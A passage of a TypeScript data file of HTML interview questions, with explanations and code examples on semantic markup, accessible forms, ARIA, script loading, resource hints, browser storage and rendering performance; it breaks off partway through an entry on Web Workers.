import { Question } from '../../types';

export const HTML_QUESTIONS: Question[] = [
  // ==========================================
  // TOPIC 1: Semantic HTML & SEO
  // ==========================================
  {
    id: 'html-1',
    stack: 'html',
    topic: 'Semantic HTML & SEO',
    title: 'Why is Semantic HTML critical, and how does it improve Accessibility (a11y) and SEO?',
    difficulty: 'Beginner',
    summary: 'Semantic HTML uses tags that clearly describe their meaning to both browser and developer (<header>, <nav>, <article>, <main>, <footer>) instead of non-semantic <div> and <span>.',
    explanation: [
      'Semantic tags communicate document hierarchy: Screen readers use landmarks (<main>, <nav>, <aside>) to allow visually impaired users to jump directly to primary sections without tabbing through repetitive links.',
      'SEO and Crawler indexing: Search engine bots parse semantic tags to understand the structure and topical importance of content, giving higher priority to <article> and <h1>-<h6> than generic containers.',
      'Built-in keyboard and device behaviors: Native elements like <button> come pre-configured with Space/Enter key listeners, focus rings, and aria-roles, which custom <div> implementations usually lack.'
    ],
    codeExample: {
      language: 'html',
      filename: 'semantic-layout.html',
      code: `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Developer Blog</title>
</head>
<body>
  <!-- Header landmark for branding & navigation -->
  <header>
    <h1>Modern Web Dev</h1>
    <nav aria-label="Main Navigation">
      <ul>
        <li><a href="/">Home</a></li>
        <li><a href="/tutorials">Tutorials</a></li>
      </ul>
    </nav>
  </header>

  <!-- Main content landmark for accessibility tools -->
  <main id="content">
    <article>
      <h2>Understanding Semantic HTML</h2>
      <p>Semantic markup provides immediate context...</p>
    </article>
  </main>

  <!-- Footer landmark -->
  <footer>
    <p>&copy; 2026 Developer Blog. All rights reserved.</p>
  </footer>
</body>
</html>`,
      output: `Renders structured document with accessible landmarks for assistive tech.`,
      executionSteps: [
        { line: 9, explanation: '<header> tag defines site branding and landmark region' },
        { line: 11, explanation: '<nav> with aria-label gives screen readers instant landmark navigation' },
        { line: 20, explanation: '<main> represents primary unique document content' },
        { line: 21, explanation: '<article> encapsulates self-contained, distributable composition' }
      ]
    },
    keyPoints: [
      'Landmark elements (<header>, <nav>, <main>, <aside>, <footer>) eliminate div-soup and improve screen reader navigation.',
      '<button> vs <div onClick>: Always use <button> because it supports focusability and Enter/Space triggers natively.',
      'Headings must follow a logical hierarchy: Never skip levels (e.g. <h1> straight to <h4>).'
    ],
    interviewTip: 'When asked about semantic elements, mention that using correct semantic tags provides out-of-the-box keyboard accessibility and WAI-ARIA role mappings without manual ARIA annotations.',
    tags: ['Semantic', 'Accessibility', 'SEO', 'DOM', 'HTML5']
  },
  {
    id: 'html-2',
    stack: 'html',
    topic: 'Semantic HTML & SEO',
    title: 'What is the difference between <article>, <section>, and <div>, and when should each be used?',
    difficulty: 'Beginner',
    summary: '<article> is self-contained distributable content. <section> groups thematically related content. <div> is a non-semantic layout container with no inherent meaning.',
    explanation: [
      '<article> represents standalone, independently distributable content — a blog post, news story, or forum post that makes sense on its own when extracted from the page.',
      '<section> groups related content with a heading. It represents a thematic grouping within a document, like chapters of a book. Always pair with a heading element.',
      '<div> is a block-level generic container with zero semantic meaning. Use it only for CSS layout purposes or when no semantic element appropriately fits the content.'
    ],
    codeExample: {
      language: 'html',
      filename: 'article-section-div.html',
      code: `<!-- Self-contained: Can be shared/syndicated on its own -->
<article>
  <h2>How React Hooks Work</h2>
  <p>Hooks allow functional components to manage state...</p>
  <section>
    <h3>useState Hook</h3>
    <p>Manages local state in a functional component.</p>
  </section>
  <section>
    <h3>useEffect Hook</h3>
    <p>Runs side effects after render cycles.</p>
  </section>
</article>

<!-- Non-semantic layout wrapper — no meaning to browsers/crawlers -->
<div class="card-grid">
  <div class="card">...</div>
</div>`,
      output: 'Browser assigns article the correct ARIA role="article" automatically.',
      executionSteps: [
        { line: 2, explanation: '<article> wraps the entire self-contained blog post' },
        { line: 5, explanation: '<section> groups thematically related sub-parts with their own headings' },
        { line: 15, explanation: '<div> used purely as a layout container with no semantic role' }
      ]
    },
    keyPoints: [
      'If you can syndicate the content (share it in an RSS feed or standalone page), use <article>.',
      '<section> always needs a heading to be meaningful — it is not a replacement for <div>.',
      'The rule of thumb: start with the most specific semantic element, fall back to <div> only as a last resort.'
    ],
    interviewTip: 'Interviewers love this question. Be specific: <article> can contain <section>s. A <section> can contain <article>s. They are complementary, not mutually exclusive.',
    tags: ['Semantic', 'HTML5', 'article', 'section', 'div']
  },
  {
    id: 'html-3',
    stack: 'html',
    topic: 'Semantic HTML & SEO',
    title: 'What are meta tags and how do Open Graph (OG) meta tags affect link sharing on social platforms?',
    difficulty: 'Beginner',
    summary: 'Meta tags provide machine-readable metadata about the page. Open Graph tags (og:title, og:description, og:image) control how pages appear when shared as rich previews on LinkedIn, Twitter, Facebook, etc.',
    explanation: [
      'Standard meta tags like <meta name="description"> influence how search engines display your page in search result snippets. The <title> tag is the single most important on-page SEO element.',
      'Open Graph Protocol (ogp.me): Facebook developed this to allow web pages to become "rich objects" in a social graph. When someone shares a URL, the platform reads og:title, og:description, og:image to build a preview card.',
      'Twitter Cards use similar but Twitter-specific meta tags (twitter:card, twitter:title, twitter:image). Without these, Twitter falls back to og: tags, which makes OG a universal baseline.'
    ],
    codeExample: {
      language: 'html',
      filename: 'meta-og-tags.html',
      code: `<head>
  <!-- Basic SEO Meta Tags -->
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="description" content="Learn React Hooks from beginner to advanced with interactive examples." />
  <title>React Hooks Guide — Interview Master</title>

  <!-- Open Graph Meta Tags for social sharing -->
  <meta property="og:type" content="article" />
  <meta property="og:title" content="React Hooks: Complete Guide" />
  <meta property="og:description" content="Master useState, useEffect, useRef and custom hooks." />
  <meta property="og:image" content="https://mysite.com/og-react-hooks.png" />
  <meta property="og:url" content="https://mysite.com/react-hooks" />

  <!-- Twitter Card -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="React Hooks: Complete Guide" />
</head>`,
      output: 'Sharing the URL on Twitter/LinkedIn renders a rich preview card with title, description and image.',
      executionSteps: [
        { line: 5, explanation: 'description meta tag populates search engine result page (SERP) snippets' },
        { line: 9, explanation: 'og:type declares this as an article for structured data purposes' },
        { line: 12, explanation: 'og:image controls the thumbnail image in social link previews' }
      ]
    },
    keyPoints: [
      'og:image should be at least 1200×630px for LinkedIn and Facebook link previews to look sharp.',
      'Every page needs a unique <title> and <meta name="description"> for SEO.',
      'Use the Facebook Sharing Debugger and Twitter Card Validator to preview and debug OG metadata.'
    ],
    interviewTip: 'Mention the canonical tag (<link rel="canonical" href="...">) which tells crawlers the preferred URL when duplicate content exists, preventing SEO penalties.',
    tags: ['Meta Tags', 'SEO', 'Open Graph', 'Social Sharing', 'Twitter Card']
  },
  // ==========================================
  // TOPIC 2: Forms & Accessibility
  // ==========================================
  {
    id: 'html-4',
    stack: 'html',
    topic: 'Forms & Accessibility',
    title: 'How do you build an accessible HTML form? Explain labels, fieldsets, and ARIA roles.',
    difficulty: 'Beginner',
    summary: 'Accessible forms pair every input with an explicit <label> using for/id matching, group related inputs in <fieldset> with <legend>, and use ARIA attributes only when native semantics fall short.',
    explanation: [
      '<label for="id"> creates a programmatic link between the label text and the input. Clicking the label focuses the input and screen readers announce the label text before the input type.',
      '<fieldset> and <legend>: Group related radio buttons or checkboxes. Screen readers announce the <legend> before each option, providing critical group context (e.g., "Payment Method: Cash / Card / UPI").',
      'ARIA when necessary: aria-required="true" communicates mandatory fields when native required is not enough. aria-describedby links additional instructions to a field. aria-live announces dynamic validation errors without page reload.'
    ],
    codeExample: {
      language: 'html',
      filename: 'accessible-form.html',
      code: `<form action="/submit" method="POST" novalidate>
  <!-- Explicit label linking via for/id pair -->
  <label for="email">Email Address <span aria-hidden="true">*</span></label>
  <input
    id="email"
    type="email"
    name="email"
    required
    aria-required="true"
    aria-describedby="email-hint"
  />
  <span id="email-hint" class="hint">We'll never share your email.</span>

  <!-- Fieldset groups related radio buttons -->
  <fieldset>
    <legend>Preferred Contact Method</legend>
    <label><input type="radio" name="contact" value="email" /> Email</label>
    <label><input type="radio" name="contact" value="phone" /> Phone</label>
  </fieldset>

  <!-- Live region for dynamic validation errors -->
  <div role="alert" aria-live="assertive" id="form-errors"></div>

  <button type="submit">Send Message</button>
</form>`,
      output: 'Screen reader announces: "Email Address, required, edit text. We\'ll never share your email."',
      executionSteps: [
        { line: 3, explanation: 'for="email" creates association between label and input#email' },
        { line: 9, explanation: 'aria-describedby links hint text to input for additional context' },
        { line: 15, explanation: '<fieldset> + <legend> group related radio choices with context' },
        { line: 21, explanation: 'role="alert" + aria-live causes screen readers to announce errors immediately' }
      ]
    },
    keyPoints: [
      'Never use placeholder as a substitute for a visible label — it disappears on focus and has low contrast.',
      'autocomplete attributes (autocomplete="email", autocomplete="current-password") help users and password managers fill forms efficiently.',
      'Required field indicators should be conveyed both visually (asterisk) and textually (aria-required="true").'
    ],
    interviewTip: 'Mention that placeholder text fails WCAG 1.4.3 contrast requirements when styled in light gray. Labels must remain visible at all times. This is a common accessibility violation in real-world applications.',
    tags: ['Forms', 'Accessibility', 'ARIA', 'label', 'fieldset']
  },
  {
    id: 'html-5',
    stack: 'html',
    topic: 'Forms & Accessibility',
    title: 'What are all the HTML5 input types and when should you use each?',
    difficulty: 'Beginner',
    summary: 'HTML5 added 13+ new input types (email, tel, number, range, date, color, file, search, url, etc.) that trigger native mobile keyboards, enable built-in browser validation, and improve UX without JavaScript.',
    explanation: [
      'type="email", type="url", type="tel": Trigger the appropriate virtual keyboard on mobile. Email shows @ symbol, tel shows numeric keypad. Browsers also add basic format validation.',
      'type="number", type="range": Number shows a stepper UI; range shows a slider. Use min, max, and step attributes to constrain valid values.',
      'type="date", type="time", type="datetime-local": Show the platform-native date/time picker, eliminating the need for complex JavaScript date pickers for simple use cases.'
    ],
    codeExample: {
      language: 'html',
      filename: 'input-types.html',
      code: `<!-- Triggers email keyboard on mobile + format validation -->
<input type="email" placeholder="user@example.com" />

<!-- Numeric stepper with constraints -->
<input type="number" min="1" max="100" step="1" value="25" />

<!-- Slider UI -->
<input type="range" min="0" max="100" step="5" value="50" />

<!-- Native date picker -->
<input type="date" min="2024-01-01" max="2030-12-31" />

<!-- Color picker -->
<input type="color" value="#0ea5e9" />

<!-- File upload — accept limits file types shown in dialog -->
<input type="file" accept=".pdf,.docx" multiple />

<!-- Search with clear (×) button in most browsers -->
<input type="search" placeholder="Search questions..." />`,
      output: 'Each input renders native UI: steppers, sliders, pickers — no JavaScript required.',
      executionSteps: [
        { line: 2, explanation: 'type="email" enables email keyboard on iOS/Android and basic @ validation' },
        { line: 5, explanation: 'min/max/step constrain valid numeric range and render stepper buttons' },
        { line: 11, explanation: 'type="date" shows OS-native calendar without any JavaScript datepicker library' },
        { line: 17, explanation: 'accept attribute restricts the file types visible in the OS file dialog' }
      ]
    },
    keyPoints: [
      'type="password" masks characters. Use autocomplete="new-password" on registration forms so password managers offer to save.',
      'type="hidden" stores values that are submitted with the form but not shown to the user.',
      'Browser support for date inputs is universal now — no need to reach for a datepicker library for basic date capture.'
    ],
    interviewTip: 'A great follow-up: input types provide progressive enhancement — even if the browser does not support them, they gracefully fall back to type="text", so users always see at least a text field.',
    tags: ['Input Types', 'HTML5', 'Forms', 'Mobile UX', 'Validation']
  },
  {
    id: 'html-6',
    stack: 'html',
    topic: 'Forms & Accessibility',
    title: 'What is ARIA, and what are the rules for using it correctly?',
    difficulty: 'Intermediate',
    summary: 'ARIA (Accessible Rich Internet Applications) is a set of HTML attributes (roles, states, properties) that supplement native HTML semantics when building custom interactive components that do not have native equivalents.',
    explanation: [
      'The 5 Rules of ARIA (from W3C): 1) Use native HTML first — never use ARIA to replace a semantic element when a native one exists. 2) Never change native semantics unless you absolutely must. 3) All interactive ARIA controls must be keyboard operable. 4) Do not use role="presentation" or aria-hidden="true" on focusable elements. 5) All interactive elements must have an accessible name.',
      'ARIA roles: role="button", role="dialog", role="tablist", role="tooltip" define what a custom element IS to assistive technology. Without role, a <div> acting as a modal is invisible to screen readers.',
      'ARIA states and properties: aria-expanded, aria-checked, aria-disabled, aria-selected communicate dynamic UI states. JavaScript must update these attributes in sync with visual changes.'
    ],
    codeExample: {
      language: 'html',
      filename: 'aria-example.html',
      code: `<!-- BAD: ARIA fighting native semantics -->
<div role="button" tabindex="0" onclick="submit()">Submit</div>

<!-- GOOD: Use native element — gets all behaviors for free -->
<button type="submit">Submit</button>

<!-- GOOD: Custom accordion that NEEDS ARIA (no native element exists) -->
<button
  aria-expanded="false"
  aria-controls="panel-1"
  id="accordion-btn"
  onclick="togglePanel()"
>
  What is JavaScript?
</button>
<div id="panel-1" role="region" aria-labelledby="accordion-btn" hidden>
  <p>JavaScript is a dynamic scripting language...</p>
</div>

<script>
function togglePanel() {
  const btn = document.getElementById('accordion-btn');
  const panel = document.getElementById('panel-1');
  const expanded = btn.getAttribute('aria-expanded') === 'true';
  btn.setAttribute('aria-expanded', String(!expanded));
  panel.hidden = expanded;
}
</script>`,
      output: 'Screen reader announces: "What is JavaScript?, collapsed, button" and on click: "What is JavaScript?, expanded, button".',
      executionSteps: [
        { line: 8, explanation: 'aria-expanded="false" communicates collapsed state to screen readers' },
        { line: 9, explanation: 'aria-controls points to the ID of the panel being controlled' },
        { line: 15, explanation: 'role="region" + aria-labelledby names the expandable section for AT' },
        { line: 22, explanation: 'JavaScript synchronizes aria-expanded with the actual visible state' }
      ]
    },
    keyPoints: [
      'aria-label provides an accessible name when no visible label text exists.',
      'aria-hidden="true" completely removes an element from the accessibility tree (useful for decorative icons).',
      'aria-live="polite" announces dynamic changes (like "3 results found") without interrupting the user.'
    ],
    interviewTip: 'The first rule of ARIA: "No ARIA is better than bad ARIA." Incorrect ARIA attributes actively harm screen reader users by creating misleading announcements.',
    tags: ['ARIA', 'Accessibility', 'a11y', 'Screen Reader', 'WAI-ARIA']
  },
  // ==========================================
  // TOPIC 3: Script Loading
  // ==========================================
  {
    id: 'html-7',
    stack: 'html',
    topic: 'Script Loading',
    title: 'What is the exact difference between regular <script>, async, and defer?',
    difficulty: 'Intermediate',
    summary: 'Standard scripts block HTML parsing during download and execution. async executes immediately upon download, while defer downloads in parallel and executes in order after DOM parsing finishes.',
    explanation: [
      'Normal <script>: The HTML parser halts completely when encountering the script tag. It fetches the script from the network and executes it synchronously before resuming parsing. This causes screen freezing / parser blocking.',
      '<script async>: The browser downloads the script in the background while continuing to parse HTML. However, the moment the file arrives, parsing pauses while the script executes. Execution order is non-deterministic.',
      '<script defer>: The browser downloads the script in the background without pausing HTML parsing. The script waits until the entire DOM is built (DOMContentLoaded) and executes in the exact order declared in the HTML document.'
    ],
    codeExample: {
      language: 'html',
      filename: 'script-loading.html',
      code: `<!-- 1. Parser Blocking: Pauses DOM parsing until fetched and run -->
<script src="heavy-analytics.js"></script>

<!-- 2. Async: Downloads asynchronously, executes immediately when ready -->
<!-- Best for independent scripts like Ads or Tracking pixels -->
<script async src="https://tracker.example.com/log.js"></script>

<!-- 3. Defer: Downloads asynchronously, executes in order after DOM parsing -->
<!-- Best for application bundles and scripts that manipulate the DOM -->
<script defer src="app-core.js"></script>
<script defer src="app-features.js"></script>`,
      output: `app-core.js runs FIRST after DOM is built, then app-features.js. tracker.js runs whenever it finishes downloading.`,
      executionSteps: [
        { line: 2, explanation: 'Regular script stops HTML parser until fetched and executed' },
        { line: 6, explanation: 'async downloads in background, interrupts parser as soon as loaded' },
        { line: 10, explanation: 'defer downloads concurrently, runs only after HTML parsing completes' },
        { line: 11, explanation: 'defer guarantees preserved script execution order (core before features)' }
      ]
    },
    keyPoints: [
      'defer is almost always preferred for application logic that touches the DOM.',
      'async is ideal for standalone third-party scripts that do not depend on other scripts or the DOM.',
      'Scripts inside <script type="module"> are deferred by default and run in strict mode.'
    ],
    interviewTip: 'Emphasize that defer maintains document execution order, whereas async scripts run on a "first come, first served" basis, which can easily break dependency chains if script B depends on script A.',
    tags: ['Scripts', 'async', 'defer', 'Performance', 'DOM Parsing']
  },
  {
    id: 'html-8',
    stack: 'html',
    topic: 'Script Loading',
    title: 'What are resource hints (preload, prefetch, preconnect, dns-prefetch) and when should you use each?',
    difficulty: 'Intermediate',
    summary: 'Resource hints are HTML link declarations that instruct the browser to perform network operations early — before the resource is actually needed — to eliminate latency from critical rendering paths.',
    explanation: [
      'preload (<link rel="preload">): Tells the browser to fetch a critical resource with high priority right now. Used for fonts, hero images, and above-the-fold CSS/JS discovered late in the document.',
      'prefetch (<link rel="prefetch">): Requests a resource the browser might need in the near future (e.g., the next page the user is likely to navigate to). Fetched at low priority during idle time.',
      'preconnect (<link rel="preconnect">): Instructs the browser to open a TCP connection + TLS handshake to an origin early, saving 100-300ms of latency before requests to third-party domains (e.g., Google Fonts CDN, API servers).',
      'dns-prefetch (<link rel="dns-prefetch">): Only resolves DNS for a domain — a weaker, more widely compatible version of preconnect.'
    ],
    codeExample: {
      language: 'html',
      filename: 'resource-hints.html',
      code: `<head>
  <!-- preload: Fetch critical font file ASAP with high priority -->
  <link rel="preload" href="/fonts/inter-var.woff2" as="font" type="font/woff2" crossorigin />

  <!-- preload: Force LCP hero image to load early -->
  <link rel="preload" href="/images/hero-banner.webp" as="image" />

  <!-- preconnect: Warm up connection to Google Fonts CDN -->
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />

  <!-- prefetch: Pre-fetch next likely page on idle -->
  <link rel="prefetch" href="/dashboard" as="document" />

  <!-- dns-prefetch: Only DNS resolution for analytics domain -->
  <link rel="dns-prefetch" href="https://analytics.example.com" />
</head>`,
      output: 'Fonts load without FOUT. Hero image counts toward better LCP score. API calls save DNS+TLS round-trip time.',
      executionSteps: [
        { line: 3, explanation: 'as="font" + crossorigin tells browser to fetch font with CORS credentials' },
        { line: 6, explanation: 'as="image" instructs browser to use correct request priority for images' },
        { line: 9, explanation: 'preconnect opens TCP+DNS+TLS early — far more powerful than dns-prefetch' },
        { line: 13, explanation: 'prefetch is low priority — browser fetches only during idle network time' }
      ]
    },
    keyPoints: [
      'preload + as= is required — incorrect "as" attribute causes the fetch to be duplicated or ignored.',
      'Do not preload too many resources — it competes for bandwidth with truly critical resources.',
      'Always pair preconnect for font CDNs with the actual @font-face declaration to avoid wasted connections.'
    ],
    interviewTip: 'Mention Core Web Vitals: preloading the LCP (Largest Contentful Paint) image is the single most impactful quick win for improving LCP score in Lighthouse audits.',
    tags: ['Performance', 'preload', 'prefetch', 'preconnect', 'Resource Hints', 'Core Web Vitals']
  },
  // ==========================================
  // TOPIC 4: Browser Storage Mechanisms
  // ==========================================
  {
    id: 'html-9',
    stack: 'html',
    topic: 'Browser Storage Mechanisms',
    title: 'Compare localStorage, sessionStorage, and Cookies in terms of capacity, lifecycle, and network transmission.',
    difficulty: 'Intermediate',
    summary: 'Cookies store 4KB and travel with every HTTP request. localStorage persists up to 5-10MB across browser restarts. sessionStorage persists only for the active tab session.',
    explanation: [
      'Cookies (4KB): Designed for server-client state management. Every HTTP request sends relevant cookies in the request header, increasing request payload overhead. Can be secured with HttpOnly and SameSite flags.',
      'localStorage (~5MB): Client-only key-value storage that persists indefinitely until cleared explicitly by script or user cache clearing. Never sent to the server automatically.',
      'sessionStorage (~5MB): Scoped strictly to the specific browser tab. Opening a link in a new tab creates a brand new session. Survives page reloads within the same tab, but destroyed when the tab closes.'
    ],
    codeExample: {
      language: 'javascript',
      filename: 'storage-comparison.js',
      code: `// 1. Local Storage: Persists across browser reboots
localStorage.setItem('userTheme', 'dark');
console.log('Saved theme:', localStorage.getItem('userTheme'));

// 2. Session Storage: Cleared when tab/window closes
sessionStorage.setItem('currentStep', 'step-3-payment');
console.log('Wizard step:', sessionStorage.getItem('currentStep'));

// 3. Document Cookie: Small payload sent with every HTTP request
document.cookie = "sessionId=xyz987; Secure; SameSite=Strict; max-age=3600";
console.log('Cookies:', document.cookie);`,
      output: `Saved theme: dark\nWizard step: step-3-payment\nCookies: sessionId=xyz987`,
      executionSteps: [
        { line: 2, explanation: 'localStorage saves persistent key-value string to browser storage' },
        { line: 6, explanation: 'sessionStorage saves ephemeral data bound to the specific browser tab' },
        { line: 10, explanation: 'Sets cookie with Secure and SameSite security attributes' }
      ]
    },
    keyPoints: [
      'Cookies: 4KB max, sent over HTTP headers, vulnerable to CSRF if not protected with SameSite=Strict/Lax.',
      'localStorage / sessionStorage: Synchronous blocking APIs; accessing huge datasets can cause main thread lag.',
      'Sensitive auth tokens: Never store sensitive JWTs or session secrets in localStorage due to XSS vulnerability. Prefer HttpOnly cookies.'
    ],
    interviewTip: 'Mention XSS security implications: any JavaScript running on the page (including third-party npm packages or CDNs) can read localStorage. HttpOnly cookies cannot be read by JavaScript, mitigating token theft.',
    tags: ['Storage', 'Cookies', 'localStorage', 'sessionStorage', 'Security']
  },
  {
    id: 'html-10',
    stack: 'html',
    topic: 'Browser Storage Mechanisms',
    title: 'What is IndexedDB and how does it differ from localStorage for storing complex data?',
    difficulty: 'Intermediate',
    summary: 'IndexedDB is a low-level, asynchronous, transactional key-value database in the browser supporting structured (non-string) data, indexes, and multi-MB storage — far beyond localStorage\'s 5MB string-only limit.',
    explanation: [
      'localStorage limitations: Only stores strings (forcing JSON.stringify/parse overhead), is synchronous (blocking), has a ~5MB quota, and cannot be queried — you can only get/set by exact key.',
      'IndexedDB capabilities: Stores JavaScript objects natively (Blobs, ArrayBuffers, Files), is fully asynchronous (Promise-based with libraries), supports indexes for fast querying, and typically allows 50-500MB+ storage depending on available disk space.',
      'Use cases: Caching API response data for offline use in Progressive Web Apps, storing user-generated content (drafts, images), persisting large UI state (document editor history), and building offline-first applications.'
    ],
    codeExample: {
      language: 'javascript',
      filename: 'indexeddb-example.js',
      code: `// Opening (or creating) an IndexedDB database
const request = indexedDB.open('InterviewPrepDB', 1);

request.onupgradeneeded = (event) => {
  const db = event.target.result;
  // Create an object store with an auto-incrementing key
  const store = db.createObjectStore('questions', { keyPath: 'id' });
  store.createIndex('by_topic', 'topic', { unique: false });
};

request.onsuccess = (event) => {
  const db = event.target.result;

  // Write a question object (not a string — a real object!)
  const tx = db.transaction('questions', 'readwrite');
  tx.objectStore('questions').put({
    id: 'js-1',
    topic: 'Closures',
    title: 'What is a closure?',
    completed: false
  });

  // Query by index: get all questions for a topic
  const idx = db.transaction('questions').objectStore('questions').index('by_topic');
  idx.getAll('Closures').onsuccess = (e) => console.log(e.target.result);
};`,
      output: '[{ id: "js-1", topic: "Closures", title: "What is a closure?", completed: false }]',
      executionSteps: [
        { line: 2, explanation: 'Opens DB connection — creates it on first run (version 1)' },
        { line: 4, explanation: 'onupgradeneeded fires during DB creation/version upgrade to define schema' },
        { line: 7, explanation: 'Object stores are like tables; keyPath="id" makes id the primary key' },
        { line: 8, explanation: 'Index enables fast lookup by topic without scanning all records' }
      ]
    },
    keyPoints: [
      'Use idb (npm) or Dexie.js to wrap IndexedDB\'s verbose callback API in clean async/await Promises.',
      'IndexedDB is same-origin: only accessible from the same protocol+domain+port.',
      'Service Workers + IndexedDB together power offline-capable PWAs by caching API responses.'
    ],
    interviewTip: 'If asked when to choose IndexedDB over localStorage: the answer is any time you need async access, store more than 5MB, store non-string objects, or need to query/filter data without loading everything into memory.',
    tags: ['IndexedDB', 'Storage', 'PWA', 'Offline', 'Browser APIs']
  },
  // ==========================================
  // TOPIC 5: Web APIs & Performance
  // ==========================================
  {
    id: 'html-11',
    stack: 'html',
    topic: 'Web APIs & Performance',
    title: 'What is the Critical Rendering Path and how does it affect page load performance?',
    difficulty: 'Intermediate',
    summary: 'The Critical Rendering Path (CRP) is the sequence of steps the browser takes to convert HTML, CSS, and JS into visible pixels — DOM construction → CSSOM construction → Render Tree → Layout → Paint.',
    explanation: [
      'DOM Construction: The HTML parser converts bytes → characters → tokens → nodes → DOM tree. This is incremental — the browser does not wait for the entire HTML to parse before beginning rendering.',
      'CSSOM Construction: CSS is render-blocking. The browser cannot build the Render Tree until all CSS in <link> tags is fully downloaded and parsed into a CSSOM. Inline CSS eliminates this network dependency.',
      'Render Tree, Layout, Paint: Render Tree merges DOM + CSSOM (excluding hidden elements). Layout calculates exact positions and sizes. Paint converts to actual pixels. JavaScript can force synchronous layout (layout thrashing) if it reads and writes DOM in alternating loops.'
    ],
    codeExample: {
      language: 'html',
      filename: 'crp-optimization.html',
      code: `<!-- ANTI-PATTERN: Render-blocking CSS and JS in <head> -->
<head>
  <link rel="stylesheet" href="styles.css" />   <!-- blocks rendering -->
  <script src="analytics.js"></script>           <!-- blocks parsing -->
</head>

<!-- OPTIMIZED: Inline critical CSS + defer non-critical JS -->
<head>
  <!-- Critical above-the-fold CSS inlined to avoid render-blocking network request -->
  <style>
    body { margin: 0; font-family: Inter, sans-serif; background: #0f172a; }
    header { height: 56px; background: #1e293b; }
  </style>

  <!-- Non-critical CSS loaded asynchronously -->
  <link rel="preload" href="full-styles.css" as="style" onload="this.rel='stylesheet'" />

  <!-- JS deferred — doesn't block parsing -->
  <script defer src="app.js"></script>
</head>`,
      output: 'First Contentful Paint (FCP) improves by 800-1500ms — users see content faster.',
      executionSteps: [
        { line: 10, explanation: 'Inlined critical CSS eliminates network round-trip before first render' },
        { line: 15, explanation: 'preload + onload trick async-loads CSS without render blocking' },
        { line: 18, explanation: 'defer prevents JS from blocking HTML parsing and DOM construction' }
      ]
    },
    keyPoints: [
      'Minimize render-blocking resources: inline critical CSS, defer non-critical JS, async third-party scripts.',
      'Avoid layout thrashing: do all DOM reads first, then all writes, never interleave them.',
      'Use Chrome DevTools Performance panel to visualize the CRP waterfall and identify bottlenecks.'
    ],
    interviewTip: 'Core Web Vitals map directly to CRP optimization: FCP measures time to first meaningful paint, LCP measures when the largest content element is painted, and CLS measures layout stability.',
    tags: ['Critical Rendering Path', 'Performance', 'FCP', 'LCP', 'Core Web Vitals']
  },
  {
    id: 'html-12',
    stack: 'html',
    topic: 'Web APIs & Performance',
    title: 'What is the Intersection Observer API and how is it used for lazy loading?',
    difficulty: 'Intermediate',
    summary: 'Intersection Observer is a browser API that asynchronously watches when an element enters or exits the viewport, enabling scroll-triggered lazy loading without expensive scroll event listeners.',
    explanation: [
      'The Problem: Traditional scroll event listeners call callbacks synchronously on every scroll frame (60fps), forcing style recalculations and causing jank. Each getBoundingClientRect() call forces a synchronous layout.',
      'Intersection Observer: Offloads visibility detection to the browser\'s native implementation, which batches checks and runs off the main thread. Callbacks fire asynchronously only when elements cross defined thresholds.',
      'Lazy Loading Pattern: Set data-src on image elements instead of src. When IntersectionObserver detects an image within 100px of the viewport, swap data-src into src to trigger actual image loading.'
    ],
    codeExample: {
      language: 'javascript',
      filename: 'lazy-loading.js',
      code: `// HTML: <img data-src="/images/hero.webp" class="lazy" alt="Hero" />

const observer = new IntersectionObserver(
  (entries) => {
    entries.forEach((entry) => {
      if (entry.isIntersecting) {
        const img = entry.target;
        // Swap placeholder with real image src
        img.src = img.dataset.src;
        img.classList.remove('lazy');
        // Stop observing once loaded — saves memory
        observer.unobserve(img);
      }
    });
  },
  {
    rootMargin: '100px 0px', // Load 100px before entering viewport
    threshold: 0.01          // Trigger when 1% of element is visible
  }
);

// Observe all lazy images
document.querySelectorAll('img.lazy').forEach((img) => observer.observe(img));`,
      output: 'Images load 100px before entering the viewport — zero jank, zero scroll listeners.',
      executionSteps: [
        { line: 3, explanation: 'Creates observer with callback that fires when elements cross threshold' },
        { line: 8, explanation: 'Swaps data-src to src to trigger network image fetch' },
        { line: 11, explanation: 'unobserve() removes element from observation to prevent memory leaks' },
        { line: 15, explanation: 'rootMargin extends the viewport boundary by 100px to pre-load just ahead' }
      ]
    },
    keyPoints: [
      'Native <img loading="lazy"> attribute provides the same effect without any JavaScript for modern browsers.',
      'Intersection Observer also powers infinite scroll, sticky header behavior, and animation-on-scroll effects.',
      'Always call observer.disconnect() or unobserve() to prevent memory leaks after elements are loaded.'
    ],
    interviewTip: 'Mention that native lazy loading (loading="lazy") now has 95%+ browser support and is zero-JavaScript — it should be your first choice. IO API is for custom logic beyond simple images.',
    tags: ['Intersection Observer', 'Lazy Loading', 'Performance', 'Scroll', 'Web APIs']
  },
  {
    id: 'html-13',
    stack: 'html',
    topic: 'Web APIs & Performance',
    title: 'What is Web Workers and how do they enable true parallelism in the browser?',
    difficulty: 'Advanced',
    summary: 'Web Workers execute JavaScript in background threads independent of the main UI thread. They communicate via postMessage() and cannot access the DOM, but enable CPU-intensive work without blocking the UI.',
    explanation: [
      'The Problem: JavaScript is single-threaded on the main thread. CPU-intensive tasks (image processing, encryption, sorting millions of records, running ML models) freeze the UI because they block the event loop.',
      'Web Workers: Spawn truly separate OS-level threads via new Worker("worker.js"). The worker runs its own event loop, has access to fetch, WebSockets, and timers, but has no access to document, window, or DOM.',
      'Communication: Main thread and worker communicate exclusively via postMessage()/onmessage. Data is copied (structured clone) or transferred (transferable objects like ArrayBuffer for zero-copy speed).'
    ],
    codeExample: {
      language: 'javascript',
      filename: 'main.js',
      code: `// ========== main.js (runs on main thread) ==========
const worker = new Worker('heavy-worker.js');

// Send data to worker for processing
worker.postMessage({ data: largeArray, operation: 'sort' });

// Receive result without blocking the UI
worker.onmessage = (event) => {
  console.log('Sorted result received:', event.data.result);
  renderTable(event.data.result); // safe to update DOM here
};

worker.onerror = (err) => console.error('Worker error:', err.message);

// ========== heavy-worker.js (runs in worker thread) ==========
self.onmessage = (event) => {
  const { data, operation } = event.data;
  if (operation === 'sort') {
    // This heavy computation happens off the main thread!
    const sorted = [...data].sort((a, b) => a - b);
    // Send result back to main thread
    self.postMessage({ result: sorted });
  }
};`,
      output: 'Main thread remains responsive (60fps scroll/animation). Sorting 1M items completes in background.',
      executionSteps: [
